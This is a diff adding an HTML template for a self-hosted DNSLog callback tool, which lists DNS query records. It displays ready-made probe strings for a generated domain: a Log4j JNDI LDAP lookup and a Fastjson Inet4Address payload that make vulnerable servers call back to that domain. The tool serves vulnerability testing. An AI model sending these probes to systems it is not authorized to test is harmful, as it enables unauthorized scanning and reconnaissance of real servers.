@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>DNSLog</title>
+    <meta name="keywords" content="dnslog">
+    <meta name="description" content="dnslog">
+
+</head>
+<body>
+<div id="header" style="text-align:center">
+    <hr style=" height:2px;border:none;border-top:2px dashed #87CEFA;">
+    <br>
+</div>
+
+    <div id="app" style="text-align: center;">
+    <form action="/dnslog_main/main/" method="post">
+        <button type="submit" name="new_domain" values="domain">刷新域名</button>
+
+        <button type="submit" name="new_A" value="AAA">刷新记录</button>
+        <button type="submit" name="about" value="AAA">相关代码</button>
+        </form>
+        <br><br>
+        <div id="myDomain">
+        {% if domain %}
+            <h1>{{ domain }}</h1>
+            <p>Log4j: ${jndi:ldap://{{ domain }}:9999/index_}</p>
+<p>Fastjson: {"@type":"java.net.Inet4Address","val":"{{ domain }}"}</p>
+
+        {% else %}
+            <h1>"NO data"</h1>
+        {% endif %}
+        </div> <!----><!----> <br>
+        <center>
+            <table id="myRecords" width="700" border="0" cellpadding="5" cellspacing="1" bgcolor="#EFF3FF"
+                   style="word-break: break-all;">
+                <tbody>
+                <tr bgcolor="#ADD3EF">
+                    <th width="50%">DNS Query Record</th>
+                    <th width="25%">IP Address</th>
+                    <th width="25%">Created Time</th>
+                </tr>
+                {% if AAA %}
+                    {% for i in  AAA %}
+                    <tr>
+                       <td width="50%">{{ i.1 }}</td>
+                        <td width="25%">{{ i.0 }}</td>
+                        <td width="25%">{{ i.2 }}</td>
+                    </tr>
+                     {% endfor %}
+                 {% else %}
+                    <tr>
+                        <td colspan="3" align="center">No Data</td>
+                    </tr>
+                 {% endif %}
+                </tbody>
+            </table>
+        </center>
+    </div>
+
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <div id="footer">
+            <hr style=" height:2px;border:none;border-top:2px dashed #87CEFA;">
+            <br>
+            <center><span style="color:#ADD3EF">DNSLog</span></center>
+        </div>
+
+
+</body>
+</html>
